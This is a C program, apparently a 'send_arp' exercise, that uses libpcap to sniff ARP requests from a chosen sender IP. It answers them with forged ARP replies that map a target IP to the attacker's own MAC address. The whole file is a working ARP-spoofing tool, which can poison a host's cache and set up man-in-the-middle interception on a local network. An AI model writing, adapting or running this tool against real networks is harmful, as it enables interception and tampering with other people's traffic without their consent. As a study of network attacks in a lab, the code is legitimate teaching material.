#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char* argv[])
{
    pcap_t* handle;                /* Session handle */
    char* dev;                     /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE]; /* Error string */
    struct bpf_program fp;         /* The compiled filter */
    char filter_exp[] = "";        /* The filter expression */
    bpf_u_int32 mask;              /* Our netmask */
    bpf_u_int32 net;               /* Our IP */
    struct pcap_pkthdr* header;    /* The header that pcap gives us */
    const u_char* packet;          /* The actual packet */
    char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
    int res;

    if (argc != 4) {
        printf("Usage: send_arp <interface> <sender ip> <target ip>\n");
        return (0);
    }

    dev = argv[1];
    strncpy(src_ip, argv[2], sizeof(src_ip));
    strncpy(dst_ip, argv[3], sizeof(dst_ip));
    printf("%s\n", dev);

    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return (2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    int fd;
    struct ifreq ifr;
    u_char* self_mac = NULL;
    u_char self_mac_store[6];
    u_char* self_ip = NULL;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (!ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        self_mac = (u_char*)ifr.ifr_hwaddr.sa_data;

        for (int i = 0; i < 6; i++) {
            //printf("%02X ", self_mac[i]);
            self_mac_store[i] = self_mac[i];
        }
        printf("\n");
    }
    if (!ioctl(fd, SIOCGIFADDR, &ifr)) {
        self_ip = (u_char*)&((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr;
        //printf("%s\n", inet_ntoa(*(struct in_addr*)self_ip));
    }

    close(fd);

    /*
    u_char s1_packet[100];
    struct ethhdr* s1_eth_hdr;
    struct ether_arp* s1_arp_hdr;

    s1_eth_hdr = (struct ethhdr*)s1_packet;
    for (int i = 0; i < ETH_ALEN; i++) {
        s1_eth_hdr->h_dest[i] = 0xFF;
        s1_eth_hdr->h_source[i] = self_mac_store[i];
        printf("%02X ", self_mac_store[i]);
    }
    s1_eth_hdr->h_proto = htons(ETHERTYPE_ARP);

    s1_arp_hdr = (struct ether_arp*)(s1_packet + 14);
    s1_arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    s1_arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    s1_arp_hdr->arp_hln = 0x06;
    s1_arp_hdr->arp_pln = 0x04;
    s1_arp_hdr->arp_op = htons(0x0001);
    for (int i = 0; i < ETH_ALEN; i++) {
        s1_arp_hdr->arp_sha[i] = self_mac_store[i];
        s1_arp_hdr->arp_tha[i] = 0x00;
    }
    unsigned int c_tmp;
    c_tmp = inet_addr(dst_ip);
    u_char* conv_tmp = (u_char*)&c_tmp;
    for (int i = 0; i < 4; i++) {
        s1_arp_hdr->arp_spa[i] = self_ip[i];
        s1_arp_hdr->arp_tpa[i] = conv_tmp[i];
    }
    printf("\n");

    if (pcap_sendpacket(handle, s1_packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
        fprintf(stderr, "Error!\n", pcap_geterr(handle));
        return (2);
    }
    printf("Packet Sent\n");

    
    const u_char* d1_packet;

    u_char dst_mac[6];
    struct ethhdr* d1_eth_hdr;
    struct ether_arp* d1_arp_hdr;
    d1_packet = pcap_next(handle, header);
    d1_eth_hdr = (struct ethhdr*) d1_packet;
    d1_eth_hdr->h_proto = ntohs(d1_eth_hdr->h_proto);
    if(s1_eth_hdr->h_proto == ETHERTYPE_ARP) {
        printf("Packet Received\n");
        d1_arp_hdr = (struct ether_arp*) (d1_packet + 14);
        d1_arp_hdr->arp_hrd = ntohs(d1_arp_hdr->arp_hrd);
        d1_arp_hdr->arp_pro = ntohs(d1_arp_hdr->arp_pro);
        d1_arp_hdr->arp_op = ntohs(d1_arp_hdr->arp_op);
        if(s1_arp_hdr->arp_op == 0x0002) {
            for(int i=0; i<6; i++) {
                dst_mac[i] = d1_arp_hdr->arp_sha[i];
            }

        }
    }
    */

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0)
            continue;

        int packet_len = header->len;
        struct ethhdr* eth_hdr;

        eth_hdr = (struct ethhdr*)packet;
        eth_hdr->h_proto = ntohs(eth_hdr->h_proto);

        if (eth_hdr->h_proto == ETHERTYPE_ARP) {
            struct ether_arp* arp_hdr;
            arp_hdr = (struct ether_arp*)(packet + 14);

            arp_hdr->arp_hrd = ntohs(arp_hdr->arp_hrd);
            arp_hdr->arp_pro = ntohs(arp_hdr->arp_pro);
            arp_hdr->arp_op = ntohs(arp_hdr->arp_op);

            if (arp_hdr->arp_op == 0x0001) {
                //printf("Request Packet\n");
                if (!strcmp(inet_ntoa(*(struct in_addr*)arp_hdr->arp_spa), src_ip)) {
                    printf("ARP Request Packet Detected!\n");
                    u_char s2_packet[100];
                    struct ethhdr* s2_eth_hdr;
                    struct ether_arp* s2_arp_hdr;

                    s2_eth_hdr = (struct ethhdr*)s2_packet;
                    for (int i = 0; i < ETH_ALEN; i++) {
                        s2_eth_hdr->h_dest[i] = eth_hdr->h_source[i];
                        s2_eth_hdr->h_source[i] = self_mac_store[i];
                    }
                    s2_eth_hdr->h_proto = htons(ETHERTYPE_ARP);

                    s2_arp_hdr = (struct ether_arp*)(s2_packet + 14);
                    s2_arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
                    s2_arp_hdr->arp_pro = htons(ETHERTYPE_IP);
                    s2_arp_hdr->arp_hln = 0x06;
                    s2_arp_hdr->arp_pln = 0x04;
                    s2_arp_hdr->arp_op = htons(0x0002);
                    for (int i = 0; i < ETH_ALEN; i++) {
                        s2_arp_hdr->arp_sha[i] = self_mac_store[i];
                        s2_arp_hdr->arp_tha[i] = arp_hdr->arp_sha[i];
                    }
                    unsigned int c2_tmp;
                    c2_tmp = inet_addr(dst_ip);
                    u_char* conv_tmp = (u_char*)&c2_tmp;
                    for (int i = 0; i < 4; i++) {
                        s2_arp_hdr->arp_spa[i] = conv_tmp[i];
                        s2_arp_hdr->arp_tpa[i] = arp_hdr->arp_spa[i];
                    }
                    printf("\n");

                    if (pcap_sendpacket(handle, s2_packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
                        fprintf(stderr, "Error!\n", pcap_geterr(handle));
                        return (2);
                    }
                    printf("ARP Request Packet Sent!\n");
                }
            }
        }
    }

    /* And close the session */
    pcap_close(handle);
    return (0);
}
